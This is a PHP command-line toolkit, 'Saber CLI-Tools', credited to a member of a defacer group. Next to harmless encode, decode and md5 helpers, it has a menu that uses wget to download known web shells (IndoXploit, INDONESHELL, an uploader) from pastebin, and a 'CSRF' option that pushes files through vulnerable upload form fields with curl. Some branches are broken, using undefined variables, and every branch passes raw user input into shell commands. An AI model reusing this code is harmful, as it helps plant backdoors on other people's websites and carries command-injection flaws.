<?php

//Author : Rommy Maulana
//Facebook : fb.com/UndeathRommy
//Github : rommymaul.github.io

  function __header() {
    print "\e[1;33m            
===========+[ Saber CLI-Tools ]+===========
      \e[0;32m_____  ___  ______ ___________ 
     /  ___|/ _ \ | ___ \  ___| ___ \
     \ `--./ /_\ \| |_/ / |__ | |_/ /
      `--. \  _  || ___ \  __||    / 
     /\__/ / | | || |_/ / |___| |\ \ 
     \____/\_| |_/\____/\____/\_| \_|                               
\e[1;33m=========+[ Coded By RommyMaul ]+==========                             
\e[0;31m>> 1. File Downloader
>> 2. Unzipper
>> 3. List Packgages
>> 4. Install New Packgages
>> 5. Encode
>> 6. Decode
>> 7. String To md5 
>> 8. Stegano With Jhead
>> 9. CLI CSRF
>> 10. About Me\e[0m";

}
echo __header();
echo "\n
\e[1;33m>> Choose One: \e[0m";
$list = fgets(STDIN);

if ($list == 1) {
function __menu() {
	print "
\e[1;33m=========+[ File Downloader ]+==========	\e[0m

\e[0;36m>> 1. IndoXploit Shell
>> 2. INDONESHELL
>> 3. Uploader
>> 4. Choose ur own file\e[0m
";

}	
echo __menu();
echo "\n\e[1;33mChoose One: \e[0m";
$filedown = fgets(STDIN);
if ($filedown == 1) {
	passthru("wget -O shellidx.php http://pastebin.com/raw/nC6pWh5a");
} elseif ($filedown == 2) {
	passthru("wget -O indoneshell.php http://pastebin.com/raw/s9z33kH7");
} elseif ($filedown == 3) {
	passthru("wget -O uploader.php http://pastebin.com/raw/1Rms1t8G");
} elseif ($filedown == 4) {
echo "File Data (file.php site.com/pathfile): ";
$video = fgets(STDIN);
passthru("wget -O $name");
}
} elseif ($list == 2) {
	echo "\n\e[1;33m=========+[ Unzipper ]+==========\e[0m \n
";
	echo "\e[0;36m>> File Name (file.zip): \e[0m";
	$unzip = fgets(STDIN);
	passthru("unzip $unzip");
	echo "\n";
} elseif ($list == 3) {
	echo "\n\e[1;33m=========+[ Packgages List ]+==========\e[0m \n";
	passthru("apt list");	
} elseif ($list == 4){
	echo "\n\e[1;33m=========+[ New Packgages ]+==========\e[0m \n
";
	echo "\e[0;36m>> Packgages To Install: \e[0m";
	$new = fgets(STDIN);
	passthru("apt install $new")
	
;
} elseif ($list == 5){
	function __encode() {
	print "
\e[1;33m=========+[ Encode ]+==========	\e[0m

\e[0;36m>> 1. base64
>> 2. url
>> 3. hex
>> 4. uu\e[0m
";

}	
echo __encode();
echo "\n\e[1;33mChoose One: \e[0m";
$encode = fgets(STDIN);

if ($encode == 1) {
	echo "\e[0;36mString To Encode: \e[0m";
	$base64 = base64_encode(str_replace("\n", '', str_replace("\r", '', fgets(STDIN))));
	echo "\e[0;36mResult: $base64 \e[0m
	
";
} elseif ($encode == 2) {
	echo "\e[0;36mString To Encode: \e[0m";
	$url = bin2hex(str_replace("\n", '', str_replace("\r", '', fgets(STDIN))));
 $url = chunk_split($url,2,'%');
 $url = "%".substr($url, 0, strlen($url) - 1); 
	echo "\e[0;36mResult: $url \e[0m
	
";
} elseif ($encode == 3) {
	echo "\e[0;36mString To Encode: \e[0m";
	$hex = bin2hex(str_replace("\n", '', str_replace("\r", '', fgets(STDIN))));
	echo "\e[0;36mResult: $hex \e[0m
	
";
} elseif ($encode == 4) {
	echo "\e[0;36mString To Encode: \e[0m";
	$uu = convert_uuencode(str_replace("\n", '', str_replace("\r", '', fgets(STDIN))));
	echo "\e[0;36mResult: $uu \e[0m	";
}
} elseif ($list == 6) {
		function __decode() {
	print "
\e[1;33m=========+[ Decode ]+==========	\e[0m

\e[0;36m>> 1. base64
>> 2. url
>> 3. hex
>> 4. uu\e[0m
";

}	
echo __decode();
echo "\n\e[1;33mChoose One: \e[0m";
$decode = fgets(STDIN);

if ($decode == 1) {
	echo "String To Decode: ";
	$dbase64 = base64_decode(str_replace("\n", '', str_replace("\r", '', fgets(STDIN))));
	echo "Result: $dbase64";
} elseif ($decode == 2) {
	echo "\e[0;36mString To Decode: \e[0m";
	$durl = urldecode(fgets(STDIN));
 echo "\e[0;36mResult: $durl \e[0m

"; 
} elseif ($decode == 3) {
	echo "\e[0;36mString To Decode: \e[0m";
	$dhex = str_replace("\n", '', str_replace("\r", '', fgets(STDIN)));
	$dhexx = hex2bin($dhex);
	echo "\e[0;36mResult: $dhexx \e[0m

";
} elseif ($decode == 4) {
	echo "\e[0;36mString To Decode: \e[0m";
	$duu = convert_uudecode(str_replace("\n", '', str_replace("\r", '', fgets(STDIN))));
	echo "\e[0;36mResult: $duu \e[0m

";
}
} elseif ($list == 7) {
print "\n\e[1;33m=========+[ Str To md5 ]+==========	\e[0m

";
	echo "\e[0;36mString To md5: \e[0m";
	$md5 = md5(str_replace("\n", '', str_replace("\r", '', fgets(STDIN))));
	echo "\e[0;36mResult: $md5 \e[0m

";
} elseif ($list == 8) {
print "\n\e[1;33m=========+[ Stegano ]+==========	\e[0m

";
	echo "\e[0;36mRemove File Comment: \e[0m";
	$jpg = fgets(STDIN);
	passthru("jhead -purejpg $jpg");
	echo "\e[0;36mInput File Comment: \e[0m";
	$jpg1 = fgets(STDIN);
	passthru("jhead -ce $jpg1");
} elseif ($list == 9) {
	function __csrf() {
			print "
\e[1;33m=========+[ CLI CSRF ]+==========	\e[0m

\e[0;36m>> 1. file
>> 2. filedata
>> 3. qqfile	\e[0m
";
	}
echo __csrf();

echo "\e[1;33m\nChoose One: \e[0m";
$csrf = fgets(STDIN);

if ($csrf == 1) {
	echo "\e[0;336mInput File & Url: \e[0m";
	$file1 = fgets(STDIN);
	passthru("curl -F file=@$file1");
} elseif ($csrf == 2) {
	echo "\e[0;36mInput File & Url: \e[0m";
	$file2 = fgets(STDIN);
	passthru("curl -F filedata=@$file2");
} elseif ($csrf == 3) {
	echo "\e[0;36mInput File & Url: \e[0m";
	$file3 = fgets(STDIN);
	passthru("curl -F qqfile=@$file3");
}
} elseif ($list == 10) {
	function __about() {
		echo "
\e[1;33m=========+[ About Me ]+==========	\e[0m

\e[0;36mName: Rommy Maulana
Title: CEO & Founder T1KUS90T
Thank's to: IndoXploit, and All Member T1KUS90T\e[0m

";
	}
	echo __about();
}
?>